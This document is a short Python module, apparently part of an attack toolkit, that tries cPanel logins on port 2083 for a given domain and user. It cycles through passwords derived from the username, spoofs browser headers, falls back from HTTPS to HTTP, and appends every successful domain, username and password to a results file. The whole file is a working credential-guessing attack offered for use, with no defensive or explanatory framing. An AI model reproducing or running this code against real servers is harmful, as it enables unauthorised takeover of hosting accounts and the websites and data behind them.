import requests

def Check(domain, user, password):
    if domain.startswith('http://'):
        domain = domain.replace('http://', '')
    elif domain.startswith("https://"):
        domain = domain.replace('https://', '')
    else:
        pass
    passwordList = [password, user, user+'123', user + '1', user + '12', user + '!@#', user + '!@', user + '_123',
                    user + '@!']
    for passs in passwordList:
        postData = {
            'user': user,
            'pass': passs
        }
        HeaderPost = {
            'Accept': '*/*',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive',
            'Content-type': 'application/x-www-form-urlencoded',
            'Cookie': 'cpsession=closed; timezone=America/Los_Angeles',
            'Host': '{}:2083'.format(domain),
            'Origin': 'https://{}:2083'.format(domain),
            'Referer': 'https://{}:2083/logout/?locale=de'.format(domain),
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0'
        }
        HeaderPost2 = {
            'Accept': '*/*',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive',
            'Content-type': 'application/x-www-form-urlencoded',
            'Cookie': 'cpsession=closed; timezone=America/Los_Angeles',
            'Host': '{}:2083'.format(domain),
            'Origin': 'http://{}:2083'.format(domain),
            'Referer': 'http://{}:2083/logout/?locale=de'.format(domain),
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0'
        }
        posturl2 = 'http://' + '{}:2083/login/?login_only=1'.format(domain)

        posturl = 'https://' + '{}:2083/login/?login_only=1'.format(domain)

        try:
            Check = requests.post(posturl, data=postData, timeout=10, headers=HeaderPost)
            if '"status":1,' in str(Check.content):
                with open('result/Cpanel.txt', 'a') as XW:
                    XW.write(' {}/cpanel:{},{}\n'.format(domain, user, passs))
            else:
                pass
        except:
            try:
                Check = requests.post(posturl2, data=postData, timeout=10, headers=HeaderPost2)
                if '"status":1,' in str(Check.content):
                    with open('result/Cpanel.txt', 'a') as XW:
                        XW.write(' {}/cpanel:{},{}\n'.format(domain, user, passs))
                else:
                    pass
            except:
                pass